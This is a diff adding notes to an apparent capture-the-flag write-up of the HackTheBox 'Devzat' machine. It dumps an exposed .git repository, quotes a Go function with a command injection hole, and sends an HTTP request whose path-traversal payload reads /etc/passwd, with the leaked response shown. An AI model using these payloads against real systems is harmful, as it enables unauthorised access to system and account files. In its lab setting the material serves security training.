@@ -169,6 +169,66 @@ pets.devzat.htb/.git/
 
 pets.devzat.htb/.git/
 
+````
+$ wget -r http://pets.devzat.htb/.git/
+$ cd pets.devzat.htb
+
+$ git status
+$ git reset --hard HEAD
+HEAD is now at ef07a04 back again to localhost only
+````
+
+There is a command injection vulnerability in main.go function loadCharacter in the species parameter:
+````golang
+func loadCharacter(species string) string {
+    cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
+    stdoutStderr, err := cmd.CombinedOutput()
+    if err != nil {
+        return err.Error()
+    }            
+    return string(stdoutStderr)
+} 
+````
+
+````http
+POST /api/pet HTTP/1.1
+Host: pets.devzat.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://pets.devzat.htb/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://pets.devzat.htb
+Content-Length: 64
+Connection: close
+
+{"name":"blah","species":"../../../../../../../etc/passwd"}
+````
+
+````http
+HTTP/1.1 200 OK
+Date: Wed, 16 Mar 2022 11:17:41 GMT
+Server: My genious go pet server
+Content-Type: text/plain; charset=utf-8
+Vary: Accept-Encoding
+Content-Length: 4048
+Connection: close
+
+[{"name":"Cookie","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Mia","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Chuck","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Balu","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Georg","species":"gopher","characteristics":"Gophers use their long teeth to help build tunnels – to cut roots, loosen rocks and push soil away. Gophers have pouches in their cheeks that they use to carry food, hence the term “pocket” gopher. Gophers are generally solitary creatures that prefer to live alone except for brief mating periods."},{"name":"Gustav","species":"giraffe","characteristics":"With those extra long legs it is not surprising that a giraffe's neck is too short to reach the ground! Giraffes have a dark bluish tongue that is very long – approximately 50 centimetres (20 inches). Male giraffes fight with their necks."},{"name":"Rudi","species":"redkite","characteristics":"The wingspan of Red Kites can reach up to 170 cm (67 inch). Considering this large wingspan, the kites are very light birds, weighing no more than 0.9-1.3 kg (2.0-2.9 Punds)! The lifespan of Red Kites is usually around 4-5 years, but they can grow as old as 26 years of age! Red Kites have bright yellow legs and a yellow bill with a brown tip."},{"name":"Bruno","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant."},{"name":"blah","species":"../../../../../../../etc/passwd","characteristics":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\npatrick:x:1000:1000:patrick:/home/patrick:/bin/bash\ncatherine:x:1001:1001:catherine,,,:/home/catherine:/bin/bash\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n"}]
+````
++ root
+
++ patrick
+
++ catherine
+
+
+
+
+
 # Root
 
 # Secrets
+
+https://0xdf.gitlab.io/2022/03/12/htb-devzat.html
